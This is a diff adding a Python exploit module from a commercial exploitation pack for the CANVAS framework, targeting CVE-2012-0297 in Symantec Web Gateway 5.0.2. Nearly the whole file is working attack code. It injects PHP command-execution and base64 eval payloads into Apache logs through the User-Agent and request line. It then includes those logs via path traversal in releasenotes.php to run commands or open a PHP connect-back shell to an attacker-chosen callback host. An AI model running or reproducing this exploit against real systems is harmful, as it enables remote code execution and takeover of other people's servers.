@@ -1,0 +1,137 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+	
+from exploitutils import *
+from ExploitTypes.php_multi import *
+
+import canvasengine
+import time
+import urllib
+import libs.spkproxy as spkproxy #for urlopen
+
+# GUI info
+NAME = "Symantec Web Gateway 5.0.2 Local File Include Vulnerability"
+
+DESCRIPTION = "Local file include vulnerability in Symantec Web Gateway 5.0.2"
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Symantec"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["VersionsAffected"] = "Symantec Web Gateway <= 5.0.2"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/53444"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2012-0297"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0297"
+DOCUMENTATION["Notes"] = ""
+
+VERSION="1.0"
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(php_multi):
+    def __init__(self):
+        php_multi.__init__(self)
+        self.port=80
+        self.host=""
+        self.ssl=""
+        self.name=NAME
+        self.basepath="/"
+        self.basepaths=["/spywall/", "/"]
+        self.command=None 
+        self.basicauth_user=""
+        self.basicauth_password=""
+        self.hostname=None
+        self.foundstrings=["Symantec Web Gateway"]
+        self.testfile="login.php"
+
+        return
+
+    def request1(self):
+        self.log_paths.extend(['../../../../../usr/local/apache2/logs/access_log', '../../../../../usr/local/apache2/logs/error_log', '../../../../../../usr/local/apache2/logs/access_log', '../../../../../../usr/local/apache2/logs/error_log'])                
+        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            tag1   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            tag2   = "".join( [random.choice(string.digits) for i in xrange(8)] )
+            command=self.command
+            command="<?php print("+tag1+");passthru('"+command+"');print("+tag2+"); ?>"
+            
+            for i in self.log_paths:     
+                s = self.gettcpsock()
+                s.connect((self.target.interface, self.port))
+        
+                try:           
+                    s.send("GET %slogin.php HTTP/1.0%s\r\nUser-Agent: %s\r\n\r\n" % (self.basepath, command, command))                                    
+                    time.sleep(0.1)
+                    data = self.UA.GET("releasenotes.php?relfile=%s" % i)                    
+    
+                    if "Permission denied" in data:
+                        self.log("[*] Log files arent readable")
+                        return 0             
+                    if tag1 in data:                        
+                        result=data.split(tag1)[1].split(tag2)[0]                        
+                        self.log("Command response: %s"%prettyprint(result))
+                        return 1                                 
+                except:
+                    pass                                            
+        else:
+            command=self.get_php_to_mosdef()
+            command=b64encode(command)
+
+            for i in self.log_paths:
+                s = self.gettcpsock()
+                s.connect((self.target.interface, self.port))
+        
+                try:
+                    data = "<?php eval(base64_decode($_SERVER['HTTP_D2'])); ?>"
+                    s.send("GET %slogin.php HTTP/1.0%s\r\nUser-Agent: %s\r\n\r\n" % (self.basepath,data,data))                
+                    time.sleep(0.1)
+                    data = self.UA.addHeader("D2", command)
+                    data = self.UA.GET("releasenotes.php?relfile=%s"%(i))
+    
+                    if "Permission denied" in data:
+                        self.log("[*] Log files arent readable")
+                        return 0
+                except:
+                    pass                        
+
+            self.log("[+] Looking for PHP connectback")        
+
+    def usage(self):
+        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
+        print "-t <target ip>"
+        print "-p <target port>                [optional]"
+        print "-O basepath: /path/to/phplist/[optional]"
+        print "-O hostname: target vhost       [optional]"
+        print "-O command:commandtorun         [optional]"
+        print "-l call back ip if doing connect back"
+        print "-d listening port for call back"
+        return
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
